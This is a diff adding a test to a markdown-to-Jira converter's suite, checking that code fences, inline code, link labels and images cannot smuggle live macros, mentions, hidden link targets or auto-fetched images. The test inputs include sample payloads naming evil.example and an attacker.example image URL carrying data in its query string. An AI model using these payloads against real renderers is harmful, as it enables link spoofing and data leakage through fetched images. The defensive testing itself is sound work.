@@ -185,6 +185,23 @@ describe("markdown <-> jira wiki markup", () => {
     expect(markdownToJira("See [the vault](https://example.com/v).")).toBe("See [the vault|https://example.com/v].");
   });
 
+  it("nothing in code, a link or an image runs: no early-closed macro, no live mention, no hidden target, no fetched image", () => {
+    // A `{code}` inside a fence used to close the macro; what followed rendered live.
+    const fenced = markdownToJira("```\nJira ends a block with {code}\n{html}<b>x</b>{html} [~accountid:557058:abc]\n```");
+    expect(fenced.match(/\{code\}/g)).toHaveLength(2);
+    expect(fenced.split("\n").at(-1)).toBe("{code}");
+    // Inline code that tries to end its monospace stays inside it.
+    expect(markdownToJira("`x}} [~accountid:557058:abc] {{y`")).toBe("{{x\\}\\} \\[~accountid:557058:abc\\] \\{\\{y}}");
+    // A `|` in a label made its second half the real target; macros in a label stayed live.
+    expect(markdownToJira("[docs.beacon.example|https://evil.example](https://docs.beacon.example/guide)")).toBe("[docs.beacon.example\\|https://evil.example|https://docs.beacon.example/guide]");
+    expect(markdownToJira("[{html}x{html}](https://e.example)")).toBe("[\\{html\\}x\\{html\\}|https://e.example]");
+    // An image at a URL is a link, not an embed every reader's browser fetches; an attachment still embeds.
+    expect(markdownToJira("![chart](https://attacker.example/p.png?d=L-004) and ![form](form-v1.png)")).toBe("[chart|https://attacker.example/p.png?d=L-004] and !form-v1.png!");
+    expect(markdownToJira("plain !https://attacker.example/p.png! text. Done!")).toBe("plain \\!https://attacker.example/p.png! text. Done!");
+    // Tables still pass through.
+    expect(markdownToJira("| a | b |\n| 1 | 2 |")).toBe("| a | b |\n| 1 | 2 |");
+  });
+
   it("recovers a PRD that Jira's editor rewrote as wiki markup", () => {
     const typedIntoJira = ["----", "feature: Scheduled maintenance", "audience: admins", "----", "h1. Scheduled maintenance", "* a bullet"].join("\n");
     const markdown = jiraToMarkdown(typedIntoJira);
